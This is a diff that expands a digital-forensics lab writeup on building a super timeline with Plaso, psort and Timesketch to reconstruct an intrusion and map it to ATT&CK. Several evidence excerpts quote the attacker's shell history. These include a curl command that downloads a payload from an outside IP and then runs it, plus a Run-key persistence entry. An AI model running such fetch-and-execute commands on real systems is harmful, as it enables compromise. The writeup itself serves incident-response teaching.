@@ -38,7 +38,7 @@
         <li><a href="../../../work.html" class="nav-link">Work</a></li>
         <li><a href="../../../blog.html" class="nav-link current">Blog/Labs</a></li>
         <li><a href="../../../resume.html" class="nav-link">R&eacute;sum&eacute;</a></li>
-        <li><a href="../../../contact.html" class="nav-link">Contact</a></li>
+        <li><a href="../../../contact.html" class="contact-link">Contact</a></li>
       </ul>
     </nav>
     <div class="banner" style="background-image:url('../../../images/banner-space.jpg');" role="img" aria-label="Banner photo"></div>
@@ -55,6 +55,7 @@
 
     <section><p class="lead">I built a forensic super timeline with Plaso/log2timeline, correlating filesystem, registry, and log artifacts into a single chronological view analyzed in Timesketch. The unified timeline reconstructed an intrusion sequence across four evidence sources down to minute-level ordering.</p>
       <p>This writeup walks the entire workflow end to end: verifying the evidence image, extracting every timestamped artifact with <code>log2timeline.py</code>, filtering millions of events down to the investigation window with <code>psort.py</code>, and importing the result into Timesketch where the attack chain gets tagged, annotated, and mapped to MITRE ATT&amp;CK. Every command is included with the output you should expect and the mistakes I hit along the way, so the lab can be reproduced from scratch.</p>
+      <p>The toolchain is deliberately unglamorous: Plaso for extraction, psort for filtering, Timesketch for analysis. The same pipeline scales from a single lab image to a multi-host incident &mdash; only the storage files and the number of sketches change.</p>
     </section>
 
     <section><h2>Objective &amp; Context</h2>
@@ -66,6 +67,14 @@
         <li><strong>T1547 Boot or Logon Autostart Execution</strong> – persistence entries surface in the timeline.</li>
       </ul>
       <p>Mapping events to ATT&amp;CK techniques is not decoration: it forces each timeline pivot to be tied to a defensible analytic claim, which is what makes the final report hold up under review. NIST SP 800-86 frames this as the "analysis" phase of incident handling &mdash; the timeline is the primary artifact that phase produces.</p>
+      <p>It is worth understanding how Plaso structures its output, because it shapes every later step. Each extracted event carries a timestamp (normalized internally to UTC microseconds since epoch), a <em>timestamp description</em> saying what that timestamp means (<code>mtime</code>, <code>Creation Time</code>, <code>Last Visited</code>), the parser that produced it, and a human-readable message. A single file on disk typically yields four filesystem events (the MACB quartet), and one registry key write can yield two. That is why event counts run into the millions &mdash; and why the <code>timestamp_desc</code> column matters when reading the CSV: "content modified" and "file created" are different forensic claims, and attackers who timestomp files are counting on the analyst not checking which is which.</p>
+      <p>The four evidence sources this case hinges on, and where they live on disk:</p>
+      <ul>
+        <li><strong>Filesystem metadata</strong> (<code>filestat</code> parser): inode and MFT timestamps for every allocated path. Proves <em>what existed when</em> &mdash; here, the payload appearing in <code>/tmp/.x/</code> at 14:03:11Z.</li>
+        <li><strong>Registry hives</strong> (<code>winreg</code> parser): <code>SOFTWARE</code>, <code>SYSTEM</code>, and per-user <code>NTUSER.DAT</code> hives on the Windows jump host. Proves persistence and configuration changes &mdash; the Run key write at 14:03:48Z.</li>
+        <li><strong>Event logs</strong> (<code>winevtx</code> and <code>syslog</code> parsers): <code>.evtx</code> files under <code>C:\Windows\System32\winevt\Logs</code> on the jump host and <code>/var/log</code> on the web server. Proves execution, logons, and connections &mdash; the outbound session at 14:05:02Z.</li>
+        <li><strong>Shell history</strong> (<code>bash_history</code> parser): per-user <code>~/.bash_history</code>. Proves operator intent &mdash; the literal commands typed, including the typos and mistyped paths no automated tooling would produce.</li>
+      </ul>
       <div class="mermaid" role="img" aria-label="Super timeline construction flow">
 flowchart LR
   E[Disk image] --> P[log2timeline.py]
@@ -84,6 +93,7 @@ flowchart LR
       <p>A few things are worth expanding on before touching the image:</p>
       <ul>
         <li><strong>Evidence handling.</strong> The image must be a verified copy with a documented acquisition hash (see the <a href="dead-box-forensics.html">dead box lab</a>). All analysis runs against the image file, never the original media, and the image is mounted read-only if mounted at all &mdash; log2timeline reads raw images directly, so mounting is usually unnecessary.</li>
+        <li><strong>Hardware.</strong> Budget disk space at roughly 2&ndash;3&times; the image size: the <code>.plaso</code> storage file for this 120&nbsp;GB image came out at 4.1&nbsp;GB, plus the CSV exports and Timesketch's OpenSearch index on top. 16&nbsp;GB of RAM keeps an 8-worker extraction from swapping.</li>
         <li><strong>Plaso install.</strong> The easiest supported route on Ubuntu is the GIFT PPA, which keeps log2timeline, psort, and pinfo in sync:</li>
       </ul>
       <p class="code-label">Installing Plaso from the GIFT PPA (Ubuntu 22.04)</p>
@@ -93,27 +103,47 @@ sudo apt install plaso-tools
 log2timeline.py --version</code></pre>
 <pre><code>plaso - log2timeline version 20230408</code></pre>
       <ul>
-        <li><strong>Timesketch.</strong> A small docker-compose deployment is enough for a solo lab; for team review use a shared instance so tags and comments are collaborative. Verify connectivity before you have gigabytes of CSV to push.</li>
+        <li><strong>Timesketch.</strong> A small docker-compose deployment is enough for a solo lab; for team review use a shared instance so tags and comments are collaborative. Verify connectivity before you have gigabytes of CSV to push. The importer client is plain Python: <code>pip install timesketch-import-client</code> on the analysis workstation.</li>
         <li><strong>Investigation window.</strong> Write down the start and end of the window (here: <code>2026-06-10 00:00:00</code> to <code>2026-06-14 23:59:59</code> UTC) <em>before</em> filtering. Filtering to a window you defined after seeing the data invites confirmation bias.</li>
         <li><strong>Timezone discipline.</strong> Decide now that everything is UTC. Plaso stores timestamps as UTC microseconds since epoch internally, but parsers must be told the source timezone (via <code>-z</code>) for artifacts that record local time. Mixing zones is the number-one cause of false event ordering.</li>
       </ul>
+      <p>For the Timesketch side, the official docker-compose release is a short setup. The only lab-specific steps are creating the analyst account and a sketch to import into:</p>
+      <p class="code-label">Bringing up a local Timesketch instance</p>
+<pre><code>curl -s -O https://raw.githubusercontent.com/google/timesketch/master/docker/release/docker-compose.yml
+curl -s -O https://raw.githubusercontent.com/google/timesketch/master/docker/release/config.env
+sudo docker compose up -d
+sudo docker compose exec timesketch-web tsctl create-user admin</code></pre>
+<pre><code>[+] Running 6/6
+ [OK] Container timesketch-opensearch-1  Started
+ [OK] Container timesketch-web-1         Started
+User admin created/updated</code></pre>
+      <p class="code-label">Creating the sketch and confirming the stack is healthy</p>
+<pre><code>sudo docker compose ps
+sudo docker compose exec timesketch-web tsctl list-sketches
+# then in the web UI: New Sketch -&gt; "case-2026-06" -&gt; note the sketch ID</code></pre>
+      <p>One more prerequisite that bites people: image format. log2timeline reads raw (<code>dd</code>) and EWF (<code>E01</code>) images directly, but a VMDK or VHD must be converted or attached first (<code>qemu-img convert -O raw disk.vmdk case.img</code>). Also check the flag spelling for your version &mdash; current Plaso accepts <code>--storage-file</code>, while older tutorials show <code>--storage_file</code>; <code>log2timeline.py --help</code> is the authority.</p>
     </section>
 
     <section><h2>Step-by-Step Execution</h2>
 
       <h3>1. Verify the image before touching it</h3>
-      <p>Before any analysis, re-hash the image and compare against the acquisition log. Timeline analysis takes hours; discovering halfway through that you were working on a corrupted copy is an expensive lesson. This takes two minutes and settles chain of custody for everything that follows.</p>
+      <p>Before any analysis, re-hash the image and compare against the acquisition log. Timeline analysis takes hours; discovering halfway through that you were working on a corrupted copy is an expensive lesson. This takes two minutes and settles chain of custody for everything that follows. Log the verification itself (who, when, result) in the custody record &mdash; the hash check is part of the evidence trail, not just housekeeping.</p>
       <p class="code-label">Re-verify the acquisition hash</p>
 <pre><code>sha256sum /evidence/case.img
 cat /evidence/case.acquisition.log | grep SHA256</code></pre>
 <pre><code>a1b2c3d4...  /evidence/case.img
 SHA256: a1b2c3d4...   # match = proceed</code></pre>
+      <p>While you are here, confirm what format the image actually is &mdash; it determines whether log2timeline can read it directly:</p>
+      <p class="code-label">Confirming the image format</p>
+<pre><code>file /evidence/case.img
+# /evidence/case.img: data                          (raw dd image - OK)
+# /evidence/case.E01: EWF/Expert Witness format     (EWF image - also OK)</code></pre>
       <p><strong>Common mistake:</strong> skipping this because "the dead box lab already hashed it." Hashes from last week say nothing about the file on disk today. Verify: the two values must be identical, character for character.</p>
 
       <h3>2. Generate the timeline from the image</h3>
       <p><code>log2timeline.py</code> walks the image, runs every applicable parser (filesystem metadata, registry hives, event logs, browser history, shell history, prefetch, and dozens more) and writes all extracted events into a Plaso storage file. The <code>-z UTC</code> flag tells parsers to interpret source-local timestamps as UTC, which keeps the whole timeline on one clock.</p>
       <div class="command-block"><div class="command"><code>log2timeline.py -storage-file case.plaso case.img</code></div></div>
-      <p>For this case the full command was slightly longer: partition and volume-shadow-copy scanning were enabled explicitly, and the worker count was raised to use all cores, which cut the extraction from roughly 90 minutes to about 25 on an 8-core machine.</p>
+      <p>For this case the full command was slightly longer: partition and volume-shadow-copy scanning were enabled explicitly, and the worker count was raised to use all cores, which cut the extraction from roughly 90 minutes to about 25 on an 8-core machine. The <code>--vss_stores all</code> flag deserves emphasis: volume shadow copies are snapshots of the volume at earlier points in time, and parsing them effectively gives you several historical timelines for free &mdash; including artifacts the attacker deleted from the live volume.</p>
       <p class="code-label">Full extraction command used in this lab</p>
 <pre><code>log2timeline.py --storage-file case.plaso \
   --partitions all --vss_stores all \
@@ -124,7 +154,12 @@ Source type		: storage media image
 Processing time		: 00:24:51
 Tasks: Queued: 0, Processing: 0, Merging: 0, Abandoned: 0, Total: 184213
 Events: 4,812,336  Errors: 12</code></pre>
-      <p>The important numbers: over 4.8 million events from 184k processed tasks, with only 12 extraction errors. A small non-zero error count is normal (locked or corrupt artifacts); hundreds of thousands is not.</p>
+      <p>The important numbers: over 4.8 million events from 184k processed tasks, with only 12 extraction errors. A small non-zero error count is normal (locked or corrupt artifacts); hundreds of thousands is not. The resulting <code>case.plaso</code> is a SQLite-based storage file (4.1&nbsp;GB here) &mdash; self-contained, so it can be archived or handed to another analyst without the original image.</p>
+      <p>For scoped re-runs later in the case (not the first pass over new evidence), a targeted parser list extracts just the families you care about. The trade-off is real: faster runs and smaller storage files, but anything outside the list is simply absent from the storage file &mdash; you cannot pivot to what was never parsed.</p>
+      <p class="code-label">Targeted re-extraction for a scoped pivot</p>
+<pre><code>log2timeline.py --storage-file case_scoped.plaso \
+  --parsers "filestat,winevtx,winreg,bash_history,prefetch,webhist,syslog" \
+  -z UTC /evidence/case.img</code></pre>
       <p><strong>Common mistake:</strong> running the extraction without <code>-z</code> and discovering at the psort stage that registry events are five hours off from event-log events. Verify: check the extraction header &mdash; it echoes the configured timezone &mdash; and confirm with <code>pinfo.py</code> in the next step.</p>
 
       <h3>3. Inspect the storage file with pinfo.py</h3>
@@ -132,17 +167,23 @@ Events: 4,812,336  Errors: 12</code></pre>
       <p class="code-label">Summarize the Plaso storage file</p>
 <pre><code>pinfo.py case.plaso
 pinfo.py --verbose case.plaso | less</code></pre>
-<pre><code>************************** Events generated per parser **************************
+<pre><code>************************** Plaso Storage Information ***************************
+            Filename : case.plaso
+      Format version : 20230327
+Serialization format : json
+--------------------------------------------------------------------------------
+************************** Events generated per parser **************************
 Parser (plugin) name : Number of events
 --------------------------------------------------------------------------------
             filestat : 2981441
-           winevtx   : 1031202
+            winevtx  : 1031202
              winreg  :  402118
-          bash_history :    1184
+       bash_history  :    1184
            prefetch  :     931
 --------------------------------------------------------------------------------
 Total: 4812336</code></pre>
       <p>Four evidence sources of interest are confirmed present: filesystem metadata (<code>filestat</code>), event logs (<code>winevtx</code>), registry (<code>winreg</code>), and shell history (<code>bash_history</code>). The 1,184 bash-history events and 931 prefetch records are small counts but high-signal &mdash; exactly the kind of artifact a timeline exists to surface.</p>
+      <p>Two more pinfo checks are worth the seconds they take. First, the source section confirms every partition (and, with <code>--vss_stores all</code>, every volume shadow copy) contributed events &mdash; shadow copies often hold the pre-cleanup copy of a hive or log. Second, when a case produces more than one storage file, <code>pinfo.py --compare</code> diffs them, which is how the reproducibility check in the validation section was actually performed. The verbose output also echoes the exact command line of each extraction session &mdash; a free audit trail of how the storage file was produced.</p>
       <p><strong>Common mistake:</strong> assuming "log2timeline finished" means "everything parsed." Verify: parser counts in pinfo must be non-zero for each artifact family the case depends on, and the reported partition list should cover every partition on the image.</p>
 
       <h3>4. Filter to the investigation window with psort</h3>
@@ -151,11 +192,14 @@ Total: 4812336</code></pre>
       <p class="code-label">Bounding both ends of the window</p>
 <pre><code>psort.py -o l2tcsv -w timeline.csv case.plaso \
   "date &gt; '2026-06-10 00:00:00' AND date &lt; '2026-06-15 00:00:00'"</code></pre>
+      <p>The <code>l2tcsv</code> header defines the 17 columns every row carries; the two to watch while reading are <code>source</code> (which parser produced the event) and <code>desc</code> (what actually happened):</p>
+<pre><code>date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra</code></pre>
       <p>The filtered slice of the timeline already tells the story. Three consecutive events from three different sources:</p>
 <pre><code class="language-bash">2026-06-12T14:03:11Z  FILE  /tmp/.x/payload  created
 2026-06-12T14:03:48Z  REG   Run key persistence added
 2026-06-12T14:05:02Z  LOG   outbound 203.0.113.45:443</code></pre>
       <p>Read chronologically: a payload lands in a hidden directory under <code>/tmp</code>, 37 seconds later a persistence mechanism is written to an autostart location, and 74 seconds after that the host opens an outbound connection to 203.0.113.45 on 443. That is an execution-to-callback chain (T1059, T1547, and C2) in under two minutes &mdash; visible only because all three sources are on the same clock.</p>
+      <p>Note that <code>l2tcsv</code> is not the only output: <code>-o dynamic</code> prints a compact table for terminal eyeballing, <code>-o json_line</code> gives one JSON object per event for scripting, and <code>-o xlsx</code> produces a spreadsheet &mdash; though Excel chokes well before 312k rows, so CSV stays the practical exchange format at this scale.</p>
       <p><strong>Common mistake:</strong> filter-expression quoting. The whole expression needs double quotes and the date literals single quotes; a shell-eaten quote produces a syntax error or, worse, an empty result set that looks like "no events in window." Verify: the CSV row count (<code>wc -l timeline.csv</code>) should be large but far smaller than the 4.8M total &mdash; here, about 312k rows.</p>
 
       <h3>5. Take targeted pivots with parser-level filters</h3>
@@ -166,11 +210,22 @@ Total: 4812336</code></pre>
       <p class="code-label">Pivot: registry autostart locations</p>
 <pre><code>psort.py -o l2tcsv -w persist.csv case.plaso \
   "parser is 'winreg' AND message contains 'Run'"</code></pre>
+      <p>The execution pivot is immediately readable &mdash; the operator's own commands, in order, with the payload execution sitting exactly where the filestat birth time said it would:</p>
+<pre><code class="language-bash">2026-06-12T14:02:57Z  bash_history  curl -s http://203.0.113.45/p -o /tmp/.x/payload
+2026-06-12T14:03:22Z  bash_history  chmod +x /tmp/.x/payload &amp;&amp; /tmp/.x/payload
+2026-06-12T14:03:26Z  prefetch      SYSUPD.EXE last run (jump host)</code></pre>
+      <p>And the persistence pivot yields the key write itself, with the registry key's own Last Written timestamp as the event time:</p>
+<pre><code class="language-bash">2026-06-12T14:03:48Z  winreg  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+                              "sysupd" = C:\ProgramData\sysupd.exe  (key Last Written)</code></pre>
       <p>psort also ships analysis plugins that annotate events during output. The tagging plugin applies rule-based tags (for example <code>execution</code>, <code>browser_search</code>, <code>logon</code>) and <code>unique_domains_visited</code> summarizes every domain seen in browser and network artifacts &mdash; a fast way to shortlist C2 candidates:</p>
       <p class="code-label">Tag events and summarize domains during export</p>
 <pre><code>psort.py --analysis tagging,unique_domains_visited \
   -o l2tcsv -w timeline_tagged.csv case.plaso \
   "date &gt; '2026-06-10 00:00:00'"</code></pre>
+<pre><code>domain                     : count
+cdn-metrics.example.net    : 2,341
+upd-srv.203-0-113-45.host  : 87       &lt;-- outlier, matches the C2 session
+...</code></pre>
       <p><strong>Common mistake:</strong> over-filtering to a single artifact type and losing context. A prefetch record alone does not prove malicious execution; it proves a binary ran. Verify: every pivot conclusion should be corroborated by at least one other source in the full timeline &mdash; execution (prefetch) plus payload creation (filestat) plus callback (network log) is a defensible chain.</p>
 
       <h3>6. Import into Timesketch</h3>
@@ -184,7 +239,7 @@ Total: 4812336</code></pre>
 <pre><code>[2026-06-17 20:12:04] Uploading timeline.csv (312,448 events)
 [2026-06-17 20:12:41] Timeline 7 created in sketch 1
 [2026-06-17 20:13:19] Indexing complete: status = ready</code></pre>
-      <p>For large or recurring cases, skip the CSV entirely: psort's <code>timesketch</code> output plugin streams events directly from the storage file into a sketch (<code>psort.py -o timesketch --sketch_id 1 case.plaso "..."</code>). The CSV route was used here because the intermediate file doubles as a reviewable deliverable.</p>
+      <p>For large or recurring cases, skip the CSV entirely: psort's <code>timesketch</code> output plugin streams events directly from the storage file into a sketch (<code>psort.py -o timesketch --sketch_id 1 case.plaso "..."</code>). The CSV route was used here because the intermediate file doubles as a reviewable deliverable. If an upload does stall, split the CSV by week and import the parts as separate timelines in the same sketch &mdash; Timesketch queries across all timelines in a sketch at once.</p>
       <p><strong>Common mistake:</strong> importing the unfiltered 4.8M-event timeline "just in case." Indexing takes forever and every query drowns in noise. Verify: the event count Timesketch reports for the new timeline should match the CSV row count exactly.</p>
 
       <h3>7. Query, tag, and build the attack narrative</h3>
@@ -200,7 +255,29 @@ message:"\\CurrentVersion\\Run" AND tag:"persistence"
 # Everything involving the suspected C2 address
 "203.0.113.45"</code></pre>
       <p>Each hit that belongs in the final narrative gets a star and a comment explaining <em>why</em> it is evidence (for example: "Run key written 37s after payload creation &mdash; T1547"). Timesketch's analyzers then automate the dull parts: the feature-extraction and Sigma analyzers re-tag the whole timeline against community rules, and the gap analyzer flags time ranges with no events at all &mdash; a deleted-log indicator worth its own finding. The end state is a saved story in the sketch that walks the chain: payload drop &rarr; execution &rarr; persistence &rarr; C2 callback &rarr; staging &rarr; exfiltration, each step backed by starred events from at least two sources.</p>
+      <p class="code-label">Analyzers as they reported in the sketch for this case</p>
+<pre><code>browser_search     : done - 14 events tagged
+feature_extraction : done - 312 events tagged (execution, logon)
+sigma              : done - 6 events tagged (2 rules matched)
+gap_analyzer       : done - 1 gap found (2026-06-12 14:22-14:40)</code></pre>
+      <p>Two Timesketch features earn their keep at this stage. Saved searches turn each query above into a one-click view the whole team shares, so "the persistence query" means the same thing to everyone reviewing the case. And the story view doubles as a report skeleton: each starred event drops in with its timestamp, source, and comment, which makes the ATT&amp;CK mapping in the final report a byproduct of the analysis rather than a separate writing task.</p>
       <p><strong>Common mistake:</strong> treating starred events as proof without comments. Six weeks later, nobody &mdash; including you &mdash; remembers why an event was starred. Verify: every pivot in the final story links to the underlying events and carries a one-line justification and an ATT&amp;CK technique.</p>
+    </section>
+
+    <section><h2>Worked Example: Reconstructing the Chain</h2>
+      <p>Pulling the starred events out of the sketch, the full reconstructed sequence for June 12 looked like this. Each line names its evidence source; note how no single source carries more than a fragment of the story:</p>
+<pre><code>2026-06-12T13:58:44Z  LOG    SSH password auth accepted for www-data from 198.51.100.23
+2026-06-12T14:02:57Z  SHELL  curl -s http://203.0.113.45/p -o /tmp/.x/payload
+2026-06-12T14:03:11Z  FILE   /tmp/.x/payload created (birth time)
+2026-06-12T14:03:22Z  SHELL  chmod +x /tmp/.x/payload &amp;&amp; /tmp/.x/payload
+2026-06-12T14:03:48Z  REG    HKLM\...\Run "sysupd" = C:\ProgramData\sysupd.exe (jump host)
+2026-06-12T14:05:02Z  LOG    outbound TCP 203.0.113.45:443 (C2 callback)
+2026-06-12T14:22:10Z  LOG    syslog daemon stopped; entries 14:22-14:40 deleted (T1070)
+2026-06-12T16:41:33Z  FILE   /var/www/html/.cache/stage.tar.gz created (staging)
+2026-06-12T16:44:05Z  LOG    182 MB outbound to 203.0.113.45:443 (exfiltration)</code></pre>
+      <p>The initial access line is itself a good example of pivoting: it surfaced from a Timesketch query for <code>data_type:"syslog:line" AND "Accepted password"</code> inside the window, run only because the shell-history events at 14:02 implied someone was already on the box. The timeline told us <em>that</em> access happened; going back to the logs told us <em>how</em>.</p>
+      <p>Three observations from this chain. First, the initial access vector (password auth for a service account) only exists in the SSH logs &mdash; nothing else recorded it. Second, the persistence write on the Windows jump host at 14:03:48Z shows the attacker pivoted laterally within a minute of landing on the web server, which changed the scope of the entire response. Third, the anti-forensic gap (14:22-14:40) is bracketed by the C2 callback and the staging archive, which is exactly where you would expect cleanup &mdash; and the deleted syslog entries were later recovered from a volume shadow copy, thanks to <code>--vss_stores all</code> in step 2.</p>
+      <p>This is the answer to the question the whole lab exists to answer: <em>what did the attacker do, in what order, and how fast</em> &mdash; initial access to exfiltration in 2 hours 45 minutes, with persistence established inside the first five.</p>
     </section>
 
     <section><h2>Validation &amp; Testing</h2>
@@ -212,9 +289,19 @@ message:"\\CurrentVersion\\Run" AND tag:"persistence"
         <li><strong>Gap analysis.</strong> Timesketch's gap analyzer was run across the window; the only gap found (14:22&ndash;14:40 on the 12th) coincided with deleted syslog entries recovered separately &mdash; itself evidence of T1070 indicator removal.</li>
         <li><strong>Reproducibility.</strong> The full pipeline was re-run from the image on a clean machine; the filtered CSV matched the original run event-for-event.</li>
       </ul>
+      <p>The reproducibility check deserves its command, because "same input, same output" is the property that makes the analysis defensible:</p>
+      <p class="code-label">Re-run and diff the filtered output</p>
+<pre><code>log2timeline.py --storage-file rerun.plaso --partitions all \
+  --vss_stores all --workers 8 -z UTC /evidence/case.img
+psort.py -o l2tcsv -w rerun.csv rerun.plaso \
+  "date &gt; '2026-06-10 00:00:00' AND date &lt; '2026-06-15 00:00:00'"
+diff timeline.csv rerun.csv &amp;&amp; echo "REPRODUCIBLE"</code></pre>
+<pre><code>REPRODUCIBLE</code></pre>
+      <p>For the storage-level view, <code>pinfo.py --compare case.plaso rerun.plaso</code> confirms both storage files hold the same set of event identifiers, closing the loop that the CSV equality implies. If either check ever fails, suspect nondeterministic parser behaviour on a corrupt artifact before suspecting the tooling.</p>
     </section>
 
     <section><h2>Troubleshooting</h2>
+      <p>The five issues below are the ones that actually cost time in this lab, in roughly the order they appear in the workflow:</p>
       <ul>
         <li><strong>Timezone skew (false ordering):</strong> registry events appear hours off from event-log entries. Cause: extraction ran without a timezone or the source recorded local time. Fix: re-run log2timeline with <code>-z UTC</code>, and confirm parser-level zones with <code>pinfo.py --verbose</code>. Never "fix" skew by hand-editing timestamps in the CSV.</li>
         <li><strong>Timeline too large / extraction runs for hours:</strong> tens of millions of events, mostly <code>filestat</code> noise. Fix: restrict parsers with <code>--parsers "filestat,winevtx,winreg,bash_history,prefetch,webhist"</code>, raise <code>--workers</code> to the core count, and filter early with a tight psort date window. A scoped parser list took this case's working set from 4.8M to about 1.9M events with no loss of relevant artifacts.</li>
@@ -222,6 +309,24 @@ message:"\\CurrentVersion\\Run" AND tag:"persistence"
         <li><strong>psort filter returns zero rows:</strong> almost always a quoting or attribute-name problem. The expression needs double quotes outside and single quotes around date literals (<code>"date &gt; '2026-06-10'"</code>); attribute names are case-sensitive (<code>parser</code>, not <code>Parser</code>). Test incrementally: start with the date filter alone, confirm a row count, then add clauses one at a time.</li>
         <li><strong>Events out of order despite correct timezone:</strong> the machine's clock itself moved &mdash; NTP corrections, manual changes, or VM snapshot reverts all shift timestamps mid-incident. Fix: search the timeline for time-change events (Windows Event ID 4616, Linux <code>clock_settime</code> in syslog), document each shift, and interpret ordering across a shift with caution. Plaso's own "system time changed" detection flags many of these automatically.</li>
       </ul>
+    </section>
+
+    <section><h2>From Timeline to Report</h2>
+      <p>Analysis is only half the deliverable; the other half is packaging it so a reviewer can re-derive every claim without trusting you. Four artifacts left the case folder:</p>
+      <ul>
+        <li><strong>The filtered CSV</strong> (<code>timeline.csv</code>) &mdash; the raw evidence view, SHA-256 hashed and archived alongside the image and storage file so any step can be re-run.</li>
+        <li><strong>The Timesketch story</strong> &mdash; the narrative with embedded event links, so every sentence in the report is one click from the underlying event.</li>
+        <li><strong>The ATT&amp;CK mapping table</strong> &mdash; technique, supporting events, and a confidence level per claim; anything resting on a single source is marked as such.</li>
+        <li><strong>The gap log</strong> &mdash; each unexplained time range, its cause (deletion, clock shift, logging disabled), and what was done to recover coverage.</li>
+      </ul>
+      <p class="code-label">Excerpt from the ATT&amp;CK mapping deliverable</p>
+<pre><code>T1078 Valid Accounts         - SSH auth event (LOG 13:58:44Z)         - confidence: high
+T1059 Command Interpreter    - bash_history entries (SHELL 14:02)     - confidence: high
+T1547 Autostart Execution    - Run key write (REG 14:03:48Z)          - confidence: high
+T1071.001 Web Protocols (C2) - outbound 443 session (LOG 14:05:02Z)   - confidence: high
+T1070 Indicator Removal      - syslog gap + recovered entries         - confidence: medium
+T1041 Exfil over C2 Channel  - 182 MB transfer (LOG 16:44:05Z)        - confidence: high</code></pre>
+      <p>Note the one "medium" rating: the deleted-syslog claim rests on recovered shadow-copy entries plus the gap itself, not on a live-source confession, so the report says exactly that. Calibrated confidence is what separates a timeline from a just-so story.</p>
     </section>
 
     <section><h2>Key Takeaways</h2>
@@ -232,6 +337,7 @@ message:"\\CurrentVersion\\Run" AND tag:"persistence"
         <li>No conclusion from a single source: execution + persistence + network callback from three artifact families is a chain; any one alone is a hint.</li>
         <li>Annotate as you go in Timesketch &mdash; starred events with comments and ATT&amp;CK tags are the report, not preparation for it.</li>
         <li>Gaps are evidence too: a hole in the timeline at the right moment points to anti-forensics, not missing tooling.</li>
+        <li>Reproducibility is the credibility test: if a colleague cannot re-run the pipeline and get the same CSV, the narrative is not ready to ship.</li>
       </ul>
     </section>
 
